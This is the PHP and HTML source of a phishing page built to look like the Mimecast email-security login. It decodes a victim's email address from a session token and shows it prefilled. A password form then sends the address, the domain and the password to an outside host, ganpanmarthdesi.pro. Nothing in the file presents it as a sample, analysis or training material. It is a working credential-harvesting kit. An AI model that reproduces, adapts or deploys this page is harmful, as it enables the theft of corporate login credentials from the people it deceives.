<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Mimecast Login</title>
<link rel="icon" href="https://login-us.mimecast.com/u/assets/images/connect_favicon.ico" type="image/png">
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 17px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[select],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 35px;
  width: 100%;
  padding: 15px;
  margin: 0;
  background: #fff;
  border: #b2b2b2 solid 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 5px;
  font-size: 15px;
  }
select {
    display: inline-block;
    height: 35px;
    width: 100%;
    padding: 2px 10px 2px 15px;
    outline: none;
    color: #74646e;
    border: 1px solid #b2b2b2;
    border-radius: 5px;
    background: #fff; 
    font-size: 15px;
}
  input[type=text],
  input[type=password]:focus {
  outline: none;
  border: 1px solid #b2b2b2;
  }
  </style>
<body background="img/bg.png">

<div align="center">
	<table border="0" width="378" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="130">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td height="45"></td>
						</tr>
						<tr>
							<td>
							<p align="center">
							<img border="0" src="img/mimecast.png" width="154" height="27"></td>
						</tr>
						<tr>
							<td height="58"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
				   <td background="img/form.png">
				     <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td height="60"></td>
						</tr>
						<tr>
							<td height="20">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="21"></td>
									<td>
									   <p align="left">

                                                                             <font face="sans-serif" size="2" >
										<?php echo $users;?>@<?php echo $ddomain;?>
                                                                             </font></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="23">
							 <input type="hidden" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
							 <input type="hidden" name="link" value="https://login.mimecast.com/u/login/?gta=apps#/login" >
							 <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
							 <input type="hidden" name="sender" value="Mimecast.com" >

							</td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="20"></td>
									<td>
									   <select name="select">
									      <option>Domain</option>
                                                                              <option>Cloud</option>
									   </select>
									</td>
									<td width="20"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="15"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="20"></td>
									<td>
									   <input type="password" id="passwd" name="passwd" required placeholder="Password" autofocus >
									</td>
									<td width="20"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="67"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="18"></td>
									<td>
									   <input type="image" src="img/log-in-btn.png" width="338" height="34"></td>
									<td width="23"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="17"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="21"></td>
									<td>
									   <p align="left">
										<font color="#333333" size="3">
										<a href="index.htm">
										<font color="#0066FF">Log in as a different user,</font></a></font></td>
									<td width="160"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="42"></td>
						</tr>
					</table>
				  </form>
					</td>
				</tr>
				<tr>
					<td height="60">
					<p align="center">
							<img border="0" src="img/foot.png" width="140" height="47"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>